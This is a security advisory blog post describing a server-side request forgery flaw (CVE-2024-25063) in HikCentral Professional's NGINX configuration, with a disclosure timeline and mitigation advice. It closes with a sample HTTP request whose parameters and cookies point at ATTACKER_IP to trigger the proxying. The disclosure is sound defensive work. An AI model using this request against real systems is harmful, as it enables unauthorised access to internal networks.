<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/vollkorn/Vollkorn-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | Server-Side Request Forgery in HikCentral Professional <= V2.5.1"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | Server-Side Request Forgery in HikCentral Professional <= V2.5.1"><meta name=twitter:title content="dubell.io | Server-Side Request Forgery in HikCentral Professional <= V2.5.1"><meta itemprop=name content="dubell.io | Server-Side Request Forgery in HikCentral Professional <= V2.5.1"><meta name=application-name content="dubell.io | Server-Side Request Forgery in HikCentral Professional <= V2.5.1"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content=2024-05-14T23:00:00+0200><meta property="article:published_time" content=2024-05-14T23:00:00+0200><base href=https://dubell.io/server-side-request-forgery-in-hikcentral-professional-v2.5.1/><link rel=canonical href=https://dubell.io/server-side-request-forgery-in-hikcentral-professional-v2.5.1/ itemprop=url><meta name=url content="https://dubell.io/server-side-request-forgery-in-hikcentral-professional-v2.5.1/"><meta name=twitter:url content="https://dubell.io/server-side-request-forgery-in-hikcentral-professional-v2.5.1/"><meta property="og:url" content="https://dubell.io/server-side-request-forgery-in-hikcentral-professional-v2.5.1/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="SSRF in all versions of HikCentral Professional - CVE-2024-25063"><meta itemprop=description content="SSRF in all versions of HikCentral Professional - CVE-2024-25063"><meta property="og:description" content="SSRF in all versions of HikCentral Professional - CVE-2024-25063"><meta name=twitter:description content="SSRF in all versions of HikCentral Professional - CVE-2024-25063"><meta itemprop=image content="https://dubell.io//img/logo2.png"><meta property="og:image" content="https://dubell.io//img/logo2.png"><meta name=twitter:image content="https://dubell.io//img/logo2.png"><meta name=twitter:image:src content="https://dubell.io//img/logo2.png"><meta property="og:updated_time" content=2024-05-14T23:00:00+0200><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.io//sitemap.xml><title>dubell.io | Server-Side Request Forgery in HikCentral Professional &lt;= V2.5.1</title></head><body><div class=container-lg><div class=row><div class=col><h1 class=logo-title><a href=/>dubell.io</a></h1><nav><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></nav></div></div><div class=row><div class=col><article><h1>Server-Side Request Forgery in HikCentral Professional &lt;= V2.5.1</h1><p><small><a href=/categories/advisories>Advisories</a> / May 14, 2024 â€¢ 1 min read</small><br><small><strong>Tags:</strong> <a href=/tags/web class=tag>web</a> <a href=/tags/exploit class=tag>exploit</a></small></p><div id=article_content><p>During an engagement, I encountered HikCentral Professional. I did not find any relevant CVEs and therefore decided to download the software and perform a quick analysis. Upon examining the related configuration files, I immediately identified a Server-Side Request Forgery (SSRF) in the NGINX configuration file. The SSRF allowed an attacker to proxy requests via HikCentral Professional, which could lead to severe consequences. For example, an attacker could use the vulnerability to reach into a private network and access internal services.</p><p>To my surprise, the vulnerability is still present as of today.</p><p><strong>Disclosure Timeline:</strong></p><ul><li><strong>2023-05-11:</strong> Initial report sent to HikVision</li><li><strong>2023-05-19:</strong> HikVision confirms the issue and claims to have developed a fix that will be released in the latest version</li><li><strong>2023-05-23:</strong> HikVision informs me that the vulnerability will be assigned a CVE</li><li><strong>2023-11-10:</strong> Sent a follow-up email</li><li><strong>2023-11-10:</strong> HikVision informs me they are still working on a fix and they believe an update will be released at the end of the year</li><li><strong>2024-02-16:</strong> HikVision informs me CVE-2024-25063 has been reserved</li><li><strong>2024-03-01:</strong> CVE-2024-25063 is published</li></ul><h2 id=mitigation>Mitigation</h2><p><strong>No official fix have been published.</strong> It is recommended to not expose HikCentral Professional to the Internet. Should that be required, use IP whitelisting.</p><h2 id=technical-description>Technical Description</h2><p>The vulnerability lies in the NGINX configuration file which receives user-input and directly passes it to the <code>proxy_pass</code> directive.</p><p>Below is an example of parameters in an HTTP requests that are directly used in the <code>proxy_pass</code> directive:</p><pre tabindex=0><code>GET /SDK/?device=ATTACKER_IP&amp;deviceroute0=ATTACKER_IP&amp;accesstype1=http&amp;accesstype0=http&amp;AgentAddress=ATTACKER_IP HTTP/1.1
Host: 127.0.0.1
Cookie: transpondvsm=ATTACKER_IP; transpondv4=ATTACKER_IP; agent=ATTACKER_IP
Connection: close
</code></pre><p>In the example above, all instances of <code>ATTACKER_IP</code> is vulnerable.</p></div></article></div></div><div class=row><footer></footer></div></div><script src=/js/bootstrap.min.js async></script><script src=/js/main.js defer async></script></body></html>